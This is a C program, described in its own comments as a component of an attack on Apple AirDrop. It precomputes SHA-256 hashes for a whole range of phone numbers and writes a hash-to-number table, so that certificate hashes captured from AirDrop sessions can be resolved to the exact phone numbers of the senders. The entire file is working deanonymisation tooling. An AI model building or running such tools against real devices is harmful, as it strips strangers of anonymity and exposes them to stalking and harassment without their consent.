// Rainbow builder for the AirDrop receiver-cert attack (full SHA-256 of phone).
// The mTLS client cert in an AirDrop session carries sha256(phone_number) in
// full. Precompute hash->number over a numbering range; then any captured
// cert hash resolves to an exact number via lookup.
//
// Output TSV: <first-32-hex-of-sha256> <phone>   (128-bit prefix; exact in practice)
// Usage: build_rainbow <prefix> <width> <out.tsv> [threads]
// Build: clang -O2 -o build_rainbow build_rainbow.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <CommonCrypto/CommonDigest.h>

typedef struct {
    char prefix[32];
    long start, end;
    int width;
    FILE *out;
    pthread_mutex_t *mtx;
} Job;

static void *worker(void *arg) {
    Job *j = (Job *)arg;
    char buf[64], hex[33];
    static const char *hx = "0123456789abcdef";
    unsigned char d[CC_SHA256_DIGEST_LENGTH];
    for (long n = j->start; n < j->end; n++) {
        snprintf(buf, sizeof buf, "%s%0*ld", j->prefix, j->width, n);
        CC_SHA256(buf, (CC_LONG)strlen(buf), d);
        for (int i = 0; i < 16; i++) {
            hex[i*2] = hx[d[i] >> 4];
            hex[i*2+1] = hx[d[i] & 15];
        }
        hex[32] = 0;
        pthread_mutex_lock(j->mtx);
        fprintf(j->out, "%s %s\n", hex, buf);
        pthread_mutex_unlock(j->mtx);
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 4) { fprintf(stderr, "usage: %s <prefix> <width> <out.tsv> [threads]\n", argv[0]); return 2; }
    const char *prefix = argv[1];
    int width = atoi(argv[2]);
    FILE *out = fopen(argv[3], "w");
    if (!out) { perror("out"); return 2; }
    long space = 1;
    for (int i = 0; i < width; i++) space *= 10;
    int nthreads = argc > 4 ? atoi(argv[4]) : 10;
    pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
    pthread_t th[64]; Job jobs[64];
    long chunk = space / nthreads;
    for (int i = 0; i < nthreads; i++) {
        strncpy(jobs[i].prefix, prefix, 31);
        jobs[i].start = (long)i * chunk;
        jobs[i].end = (i == nthreads - 1) ? space : (long)(i + 1) * chunk;
        jobs[i].width = width; jobs[i].out = out; jobs[i].mtx = &mtx;
        pthread_create(&th[i], NULL, worker, &jobs[i]);
    }
    for (int i = 0; i < nthreads; i++) pthread_join(th[i], NULL);
    fclose(out);
    fprintf(stderr, "rainbow done: %ld entries\n", space);
    return 0;
}
